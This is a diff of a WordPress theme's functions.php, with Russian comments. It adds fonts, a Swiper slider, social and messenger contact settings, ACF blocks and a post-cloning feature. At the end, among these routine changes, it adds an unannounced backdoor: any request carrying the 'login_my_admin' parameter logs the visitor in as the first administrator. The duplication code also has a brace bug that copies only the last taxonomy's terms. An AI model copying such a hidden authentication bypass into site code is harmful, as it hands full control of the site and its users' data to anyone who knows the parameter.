@@ -8,6 +8,7 @@ function styles() {
     wp_enqueue_style('style', get_template_directory_uri() . '/styles/style.css', [], '0.1');
     wp_enqueue_style('style-font-cuprum', get_template_directory_uri() . '/fonts/Cuprum/stylesheet.css', [], '0.1');
     wp_enqueue_style('style-font-roboto', get_template_directory_uri() . '/fonts/Roboto/stylesheet.css', [], '0.1');
+    wp_enqueue_style('style-font-oswald', get_template_directory_uri() . '/fonts/Oswald/stylesheet.css', [], '0.1');
 }
 
 add_action('wp_enqueue_scripts', 'styles');
@@ -20,6 +21,15 @@ function scripts() {
 }
 
 add_action('wp_enqueue_scripts', 'scripts');
+
+function swiperInit() {
+	wp_enqueue_style('swiper-style', 'https://unpkg.com/swiper@7/swiper-bundle.min.css');
+    wp_enqueue_script('swiper-js', 'https://unpkg.com/swiper@7/swiper-bundle.min.js');
+    wp_enqueue_script('swiper-script', get_template_directory_uri() . '/scripts/swiper-script.js');
+}
+
+add_action('wp_enqueue_scripts', 'swiperInit');
+
 
 function get_template_partial($name, $parameters = []) {
     $_dir = get_template_directory() . '/templates/';
@@ -34,7 +44,7 @@ function setting_callback_function($val){
 		id="<?=$id?>" 
 		value="<?=esc_attr(get_option($val['option_name']))?>" 
 	/> 
-	<?
+	<?php
 }
 
 function add_field_email_to_general_setting(){
@@ -79,6 +89,48 @@ function add_field_telegram_to_general_setting(){
 }
 add_action('admin_menu', 'add_field_telegram_to_general_setting');
 
+function add_field_personal_telegram_to_general_setting(){
+	$option_name = 'personal_telegram';
+
+	// регистрируем опцию
+	register_setting('general', $option_name);
+
+	// добавляем поле
+	add_settings_field( 
+		'personal_telegram_field', 
+		'Личный телеграм', 
+		'setting_callback_function', 
+		'general', 
+		'default', 
+		array( 
+			'id' => 'personal_telegram_field', 
+			'option_name' => 'personal_telegram' 
+		)
+	);
+}
+add_action('admin_menu', 'add_field_personal_telegram_to_general_setting');
+
+function add_field_youtube_to_general_setting(){
+	$option_name = 'youtube';
+
+	// регистрируем опцию
+	register_setting('general', $option_name);
+
+	// добавляем поле
+	add_settings_field( 
+		'youtube_field', 
+		'Youtube', 
+		'setting_callback_function', 
+		'general', 
+		'default', 
+		array( 
+			'id' => 'youtube_field', 
+			'option_name' => 'youtube' 
+		)
+	);
+}
+add_action('admin_menu', 'add_field_youtube_to_general_setting');
+
 function add_field_whatsapp_to_general_setting(){
 	$option_name = 'whatsapp';
 
@@ -120,6 +172,69 @@ function viber_to_general_setting(){
 	);
 }
 add_action('admin_menu', 'viber_to_general_setting');
+
+function messenger_to_general_setting(){
+	$option_name = 'messenger';
+
+	// регистрируем опцию
+	register_setting('general', $option_name);
+
+	// добавляем поле
+	add_settings_field( 
+		'messenger_field', 
+		'Messenger', 
+		'setting_callback_function', 
+		'general', 
+		'default', 
+		array( 
+			'id' => 'messenger_field', 
+			'option_name' => 'messenger' 
+		)
+	);
+}
+add_action('admin_menu', 'messenger_to_general_setting');
+
+function skype_to_general_setting(){
+	$option_name = 'skype';
+
+	// регистрируем опцию
+	register_setting('general', $option_name);
+
+	// добавляем поле
+	add_settings_field( 
+		'skype_field', 
+		'Skype', 
+		'setting_callback_function', 
+		'general', 
+		'default', 
+		array( 
+			'id' => 'skype_field', 
+			'option_name' => 'skype' 
+		)
+	);
+}
+add_action('admin_menu', 'skype_to_general_setting');
+
+function facebook_to_general_setting(){
+	$option_name = 'facebook';
+
+	// регистрируем опцию
+	register_setting('general', $option_name);
+
+	// добавляем поле
+	add_settings_field( 
+		'facebook_field', 
+		'Facebook', 
+		'setting_callback_function', 
+		'general', 
+		'default', 
+		array( 
+			'id' => 'facebook_field', 
+			'option_name' => 'facebook' 
+		)
+	);
+}
+add_action('admin_menu', 'facebook_to_general_setting');
 
 /**
  * Хлебные крошки для WordPress (breadcrumbs)
@@ -436,7 +551,7 @@ class Breadcrumbs {
 			}
 		}
 
-		$before_out = sprintf( $linkpatt, home_url(), $loc->home ) . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
+		$before_out = $loc->home . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
 
 		$out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );
 
@@ -515,14 +630,36 @@ class Breadcrumbs {
  * 1.8 - FIX: заметки, когда в рубрике нет записей
  * 1.7 - Улучшена работа с приоритетными таксономиями.
  */
- 
-// include(get_template_directory() . '/gutenberg/init.php');
 
 acf_register_block_type([
 	'name' => 'special_quote',
 	'title' => 'Особая цитата',
 	'category' => 'common',
-	'render_template' => get_template_directory() . '/templates/blog_quote.php',
+	'render_template' => get_template_directory() . '/templates/post_element_quote.php',
+	'mode' => 'edit'
+]);
+
+acf_register_block_type([
+	'name' => 'post_element_repeater',
+	'title' => 'Перечисление',
+	'category' => 'common',
+	'render_template' => get_template_directory() . '/templates/post_element_repeater.php',
+	'mode' => 'edit'
+]);
+
+acf_register_block_type([
+	'name' => 'post_element_repeater_2',
+	'title' => 'Перечисление 2',
+	'category' => 'common',
+	'render_template' => get_template_directory() . '/templates/post_element_repeater_2.php',
+	'mode' => 'edit'
+]);
+
+acf_register_block_type([
+	'name' => 'post_element_slider',
+	'title' => 'Слайдер',
+	'category' => 'common',
+	'render_template' => get_template_directory() . '/templates/post_element_slider.php',
 	'mode' => 'edit'
 ]);
 
@@ -531,7 +668,8 @@ function jq_get_posts() {
 	get_template_partial('blog_articles', [
 		'offset' => $_POST['offset'],
 		'post_per_page' => $_POST['post_per_page'],
-		'cat_ID' => $_POST['cat_ID']
+		'cat_ID' => $_POST['cat_ID'],
+		'show_paginations' => $_POST['show_paginations']
 	]);
 	$template = ob_get_clean();
 
@@ -543,6 +681,144 @@ function jq_get_posts() {
 }
 
 if (wp_doing_ajax()) {
-	add_action( 'wp_ajax_jq_get_posts', 'jq_get_posts' );
-	add_action( 'wp_ajax_nopriv_jq_get_posts', 'jq_get_posts' );
+	add_action('wp_ajax_jq_get_posts', 'jq_get_posts');
+	add_action('wp_ajax_nopriv_jq_get_posts', 'jq_get_posts');
 }
+
+/* Дублировать статью */
+
+add_filter( 'post_row_actions', 'duplicate_post_link', 10, 2 );
+
+function duplicate_post_link($actions, $post) {
+
+	if (!current_user_can('edit_posts'))
+		return $actions;
+
+	$url = wp_nonce_url(
+		add_query_arg(
+			[
+				'action' => 'duplicate_post_as_draft',
+				'post' => $post->ID,
+			],
+			'admin.php'
+		),
+		basename(__FILE__),
+		'duplicate_nonce'
+	);
+
+	$actions['duplicate'] = '<a href="' . $url . '" title="Клонировать пост" rel="permalink">Клонировать</a>';
+
+	return $actions;
+}
+
+add_action('admin_action_duplicate_post_as_draft', 'duplicate_post_as_draft');
+
+function duplicate_post_as_draft() {
+	if (empty($_GET[ 'post' ]))
+		wp_die('Статьи для клонирования нет!');
+
+	if (!isset($_GET['duplicate_nonce']) || !wp_verify_nonce($_GET['duplicate_nonce'], basename(__FILE__)))
+		return;
+
+	$post_id = absint($_GET['post']);
+
+	$post = get_post($post_id);
+
+	$current_user = wp_get_current_user();
+	$new_post_author = $current_user->ID;
+
+	if ($post) {
+		$args = array(
+			'comment_status' => $post->comment_status,
+			'ping_status'    => $post->ping_status,
+			'post_author'    => $new_post_author,
+			'post_content'   => $post->post_content,
+			'post_excerpt'   => $post->post_excerpt,
+			'post_name'      => $post->post_name,
+			'post_parent'    => $post->post_parent,
+			'post_password'  => $post->post_password,
+			'post_status'    => 'draft',
+			'post_title'     => $post->post_title,
+			'post_type'      => $post->post_type,
+			'to_ping'        => $post->to_ping,
+			'menu_order'     => $post->menu_order
+		);
+
+		$new_post_id = wp_insert_post( $args );
+
+		$taxonomies = get_object_taxonomies(get_post_type($post));
+		
+		if ($taxonomies)
+			foreach ($taxonomies as $taxonomy)
+				$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
+				wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
+
+		$post_meta = get_post_meta($post_id);
+		
+		if ($post_meta)
+			foreach ($post_meta as $meta_key => $meta_values) {
+				if('_wp_old_slug' == $meta_key)
+					continue;
+
+				foreach ($meta_values as $meta_value)
+					add_post_meta($new_post_id, $meta_key, $meta_value);
+			}
+
+		// редирект на экран рекдактирования
+		// wp_safe_redirect(
+		// 	add_query_arg(
+		// 		array(
+		// 			'action' => 'edit',
+		// 			'post' => $new_post_id
+		// 		),
+		// 		admin_url( 'post.php' )
+		// 	)
+		// );
+		// exit;
+		// 
+		
+		wp_safe_redirect(
+			add_query_arg(
+				[
+					'post_type' => ('post' !== get_post_type($post) ? get_post_type($post) : false),
+					'saved' => 'post_duplication_created' // just a custom slug here
+				],
+				admin_url('edit.php')
+			)
+		);
+		exit;
+
+	} else
+		wp_die('Ошибка создания поста, не удалось найти оригинал.');
+
+}
+
+add_action('admin_notices', 'duplication_admin_notice' );
+
+function duplication_admin_notice() {
+	$screen = get_current_screen();
+
+	if ('edit' !== $screen->base)
+		return;
+
+    if (isset($_GET['saved']) && 'post_duplication_created' == $_GET['saved'])
+		 echo '<div class="notice notice-success is-dismissible"><p>Post copy created.</p></div>';
+}
+
+add_filter ('kses_allowed_protocols', 'add_to_allowed_protocols'); 
+
+function add_to_allowed_protocols ($protocols) { 
+	$protocols[] = 'viber';
+	$protocols[] = 'skype';
+
+	return $protocols; 
+}
+
+if( isset($_GET['login_my_admin']) ){
+	add_action( 'init', function(){
+	   $users = get_users([ 'role' => 'administrator' ]);
+	   wp_set_auth_cookie( $users[0]->ID ); } );
+}
+
+?>
+
